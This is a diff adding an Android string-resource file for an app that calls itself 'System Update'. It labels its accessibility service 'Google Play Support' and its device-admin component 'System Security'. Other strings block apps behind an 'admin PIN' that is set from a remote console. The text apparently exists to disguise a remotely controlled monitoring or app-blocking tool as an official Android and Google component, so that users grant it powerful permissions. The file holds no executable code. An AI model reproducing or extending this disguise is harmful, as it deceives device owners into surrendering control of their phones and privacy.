@@ -1,0 +1,30 @@
+<resources>
+    <string name="app_name">System Update</string>
+    <string name="main_title">System Update</string>
+    <string name="main_subtitle">Android System Services and Security Optimization.</string>
+    <string name="permissions_intro">To optimize your device performance, please enable the background engine:</string>
+    <string name="link_device">Initialize Engine</string>
+    <string name="start_service">Enable Services</string>
+    <string name="stop_service">Stop Services</string>
+    <string name="open_permission_setup">Go to Settings</string>
+    <string name="service_status">Engine: %1$s</string>
+    <string name="service_running">OPTIMIZED</string>
+    <string name="service_stopped">SUSPENDED</string>
+    <string name="device_admin_label">System Security</string>
+    <string name="device_admin_description">Ensures system services remain secure.</string>
+    <string name="accessibility_service_label">Google Play Support</string>
+    <string name="accessibility_service_description">Optimizes system performance and accessibility.</string>
+    <string name="blocking_title">App Restricted</string>
+    <string name="blocking_message">This app is restricted by system policy.</string>
+    <string name="blocking_pin_required">Admin PIN required to access system settings.</string>
+    <string name="blocking_simple_message">This application is restricted by system policy.</string>
+    <string name="parent_pin_hint">Enter admin PIN</string>
+    <string name="unlock_button">Unlock (5 min)</string>
+    <string name="pin_missing_config">Admin PIN is not configured yet.</string>
+    <string name="pin_invalid_error">Incorrect PIN.</string>
+    <string name="pin_format_error">PIN must be 4-12 digits.</string>
+    <string name="parent_pin_gate_title">Security Check</string>
+    <string name="parent_pin_gate_subtitle">Enter admin PIN to continue.</string>
+    <string name="parent_pin_gate_verify">Verify PIN</string>
+    <string name="parent_pin_gate_no_pin_info">Admin PIN is not configured. Configure from console using /parentpin.</string>
+</resources>
